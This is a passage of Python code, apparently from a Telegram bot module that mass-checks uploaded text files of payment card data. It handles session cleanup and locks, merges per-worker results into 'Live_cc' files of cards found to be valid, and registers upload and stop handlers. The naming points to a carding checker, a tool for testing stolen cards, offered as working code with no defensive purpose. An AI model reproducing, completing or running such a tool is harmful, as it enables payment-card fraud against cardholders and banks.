            if chat_id in activechecks:
                del activechecks[chat_id]

            if lock.locked():
                lock.release()

            logger.info(f"[SESSION END] Lock released & cleanup fully finished for {chat_id}")

        except Exception as e:
            logger.error(f"[FINAL CLEANUP ERROR] {e}")

        # Schedule delayed recheck cleanup in 5s (ensures deletion after background threads)
        user_busy[chat_id] = False
        threading.Timer(5.0, cleanup_all_raw_files, args=(chat_id,)).start()


def merge_livecc_user_files(user_id: str, max_workers: int = 5):
    folder = os.path.join("live-cc", str(user_id))
    merged_file = os.path.join(folder, f"Live_cc_{user_id}_merged.json")
    all_data = []
    for i in range(1, max_workers + 1):
        path = os.path.join(folder, f"Live_cc_{user_id}_{i}.json")
        if os.path.exists(path):
            try:
                with open(path, "r", encoding="utf-8") as f:
                    all_data.extend(json.load(f))
            except Exception as e:
                logger.warning(f"[MERGE ERROR] {path}: {e}")
    with open(merged_file, "w", encoding="utf-8") as f:
        json.dump(all_data, f, indent=2, ensure_ascii=False)
    logger.info(f"[MERGED LIVECC] Saved {len(all_data)} results to {merged_file}")
    return merged_file


# ================================================================
# 🪄 REGISTER BOT HANDLERS (called from main.py)
# ================================================================
def register_mass_handlers(bot):
    """Attach mass-check handlers to bot instance."""
    @bot.message_handler(content_types=["document"])
    def handle_document_upload(message):
        """Triggered when user uploads .txt file."""
        if not message.document.file_name.lower().endswith(".txt"):
            bot.reply_to(message, "❌ Please upload a .txt file containing card data.")
            return
        threading.Thread(
            target=run_mass_check_thread,
            args=(bot, message),
            daemon=True
        ).start()

    @bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
    def callback_stop(call):
        """Handle STOP button press."""
        try:
            chat_id = str(call.message.chat.id)
            set_stop_event(chat_id)
            safe_send_message(bot, chat_id, "🛑 Stop command acknowledged.")
        except Exception as e:
            logger.warning(f"[STOP HANDLER ERROR] {e}")


# ================================================================
# 🧩 MODULE READY
# ================================================================
logger.info("✅ mass_check module loaded and ready for execution.")
